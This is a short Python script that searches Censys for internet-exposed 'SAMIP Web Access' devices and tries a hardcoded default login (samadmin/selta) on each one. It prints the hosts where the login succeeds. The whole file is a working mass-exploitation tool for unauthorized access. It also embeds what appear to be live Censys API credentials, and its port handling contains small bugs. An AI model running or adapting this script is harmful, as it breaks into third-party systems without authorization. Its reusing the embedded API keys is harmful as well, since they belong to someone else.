import censys
import censys.ipv4
from censys.base import CensysException
import sys
import os
import re
import requests
uid = "94603c14-f44d-48e0-9f82-750daf3c5453"
srt = "wxAf6AFfZ1UXjhkVXKgKFGR8L91VrJz6"
query= ['80.http.get.title:"SAMIP Web Access"',
        '443.http.get.title:"SAMIP Web Access"',
        '8080.http.get.title:"SAMIP Web Access"',
        '8888.http.get.title:"SAMIP Web Access"']

params= {'lang':'it','username':'samadmin','MultiDOminio':'0','password':'selta','submit':'LOGIN'}


try:
    for q in query:
        for record in censys.ipv4.CensysIPv4(api_id=uid, api_secret=srt).search(q):
            ip = record['ip']
            port = record['protocols']
            port_raw = port[0]
            port = re.findall(r'\d+', port_raw)
            if port[0] == 443 or port[0] == 8888:
                url = "https://" + ip + ":" + "/php/SamLogin.php"
            else:
                url = "http://" + ip + ":" + port[0]+ "/php/SamLogin.php"
            try:
                r = requests.post(url, data=params, verify=False)
                if 'Pannello' in r.text or 'sessione' in r.text:
                    print("http://"+ ip+ ":" + port[0])
            except requests.exceptions.SSLError:
                pass
            except requests.exceptions.ConnectionError:
                pass
except KeyboardInterrupt:
                print("[*]Exiting...")
